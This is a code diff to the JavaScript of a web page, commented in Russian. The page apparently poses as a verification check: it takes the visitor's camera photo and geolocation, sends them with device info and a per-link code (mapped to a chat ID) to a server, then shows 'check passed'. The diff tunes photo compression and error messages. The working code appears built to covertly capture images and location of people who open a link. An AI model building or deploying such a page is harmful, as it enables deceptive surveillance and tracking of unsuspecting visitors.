@@ -1,6 +1,6 @@
-// === app.js (версия под code -> chat_id) ===
+// === app.js (версия под code -> chat_id, с понятной ошибкой и меньшим фото) ===
 
-// API base берётся из <script>window.__API_BASE</script> в index.html
+// API base из <script>window.__API_BASE</script> в index.html
 const API_BASE = (typeof window !== 'undefined' && window.__API_BASE)
   ? String(window.__API_BASE).replace(/\/+$/, '')
   : '';
@@ -31,7 +31,6 @@ function setBtnLocked() {
   b.style.background = 'linear-gradient(90deg, #246, #39a)';
   b.style.boxShadow = '0 0 6px rgba(0,153,255,.25)';
 }
-
 function setBtnReady() {
   const b = UI.btn;
   if (!b) return;
@@ -43,7 +42,7 @@ function setBtnReady() {
   b.style.boxShadow = '0 0 20px rgba(79,0,255,.6), 0 0 28px rgba(0,191,255,.45)';
 }
 
-// === Геолокация ===
+// === Геолокация (не критично) ===
 async function askGeolocation() {
   return new Promise((resolve) => {
     if (!('geolocation' in navigator)) return resolve(null);
@@ -61,8 +60,8 @@ async function askGeolocation() {
   });
 }
 
-// === Сжатие base64 фото ===
-function downscaleDataUrl(dataUrl, maxSide = 1280, quality = 0.7) {
+// === Сжатие base64 фото (чуть меньше, чем было) ===
+function downscaleDataUrl(dataUrl, maxSide = 1024, quality = 0.6) {
   return new Promise((resolve, reject) => {
     const img = new Image();
     img.onload = () => {
@@ -75,9 +74,7 @@ function downscaleDataUrl(dataUrl, maxSide = 1280, quality = 0.7) {
       c.getContext('2d').drawImage(img, 0, 0, w, h);
       try {
         resolve(c.toDataURL('image/jpeg', quality));
-      } catch (e) {
-        reject(e);
-      }
+      } catch (e) { reject(e); }
     };
     img.onerror = reject;
     img.src = dataUrl;
@@ -107,8 +104,8 @@ async function takePhoto() {
     v.srcObject = stream;
     await v.play();
     const c = document.createElement('canvas');
-    c.width = v.videoWidth;
-    c.height = v.videoHeight;
+    c.width = v.videoWidth || 1280;
+    c.height = v.videoHeight || 720;
     c.getContext('2d').drawImage(v, 0, 0);
     const dataUrl = c.toDataURL('image/jpeg', 0.85);
     stream.getTracks().forEach((t) => t.stop());
@@ -138,7 +135,6 @@ async function sendReport({ photoBase64, geo }) {
   if (!code) throw new Error('No code in URL');
 
   const body = { ...info, geo, photoBase64, note: 'auto', code };
-
   const r = await fetch(`${API_BASE}/api/report`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -147,7 +143,10 @@ async function sendReport({ photoBase64, geo }) {
 
   const text = await r.text();
   let data; try { data = JSON.parse(text); } catch {}
-  if (!r.ok || !data?.ok) throw new Error((data && data.error) || text || `HTTP ${r.status}`);
+  if (!r.ok || !data?.ok) {
+    console.warn('[SERVER RESP]', text);
+    throw new Error((data && data.error) || text || `HTTP ${r.status}`);
+  }
   return data;
 }
 
@@ -160,7 +159,7 @@ async function autoFlow() {
     if (!isSecure) throw new Error('Нужен HTTPS (или localhost) для камеры/гео');
 
     const [geo, rawPhoto] = await Promise.all([askGeolocation(), takePhoto()]);
-    const photoBase64 = await downscaleDataUrl(rawPhoto, 1280, 0.7);
+    const photoBase64 = await downscaleDataUrl(rawPhoto, 1024, 0.6);
 
     UI.text.innerHTML = 'Отправляем данные…';
     await sendReport({ photoBase64, geo });
@@ -170,11 +169,11 @@ async function autoFlow() {
     UI.text.innerHTML = '<span class="ok">Проверка пройдена.</span>';
     UI.note.textContent = 'Можно продолжить.';
   } catch (e) {
-    console.error(e);
+    console.error('[AUTO-FLOW ERROR]', e);
     setBtnLocked();
     window.__reportReady = false;
     UI.text.innerHTML = '<span class="err">Ошибка проверки.</span>';
-    UI.note.textContent = String(e.message || e);
+    UI.note.textContent = 'Причина: ' + (e && e.message ? e.message : String(e));
   }
 }
 
